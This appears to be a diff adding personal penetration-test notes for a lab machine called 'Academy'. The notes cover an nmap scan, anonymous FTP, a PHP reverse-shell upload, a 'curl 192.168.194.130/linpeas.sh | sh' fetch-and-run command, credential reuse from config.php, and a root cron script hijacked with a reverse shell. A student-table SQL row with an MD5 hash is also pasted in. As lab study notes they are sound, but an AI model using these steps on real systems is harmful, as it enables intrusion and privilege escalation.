@@ -1,0 +1,27 @@
+- nmap scan: nmap -T4 -A -p- 10.129.187.176
+- guessed that php was the programming language used (it always is...)
+- ftp as anonymous allowed us to download notes.txt that had a user account login
+- logging in, we found a page that allows php uploads
+- uploaded pentestmonkey/php-reverse-shell
+- we then got linpeas.sh to run on the victim in tmp folder from our http server to hunt for priv escalation opportunities
+- revealed /var/www/html/academy/includes/config.php that has a user account name and password
+- also revealed a .sh file grimmie has running periodically for a backup
+- su grimmie to switch user and use that password
+- crontab to view script schedules - doesn't help us in this case, but useful sometimes
+	- same for systemctl list-timers
+- pspy tool ran on the victim shows that thie /home/grimmie/backup.sh is run every minute
+- we edit the backup.sh file with a one-liner bash reverse shell by pentestmonkey (the backup cronjob is run as root)
+
+
+INSERT INTO `students` 
+(`StudentRegno`,	 `studentPhoto`,	 `password`,				 `studentName`, `pincode`,	 `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES
+('10201321',		 '',			 'cd73502828457d15655bbd7a63fb0bc8',	 'Rum Ham',	 '777777',	 '', '', '', '7.60', '2021-05-29 14:36:56', '');
+						student in md5
+
+
+
+
+
+21:15
+
+curl 192.168.194.130/linpeas.sh | sh
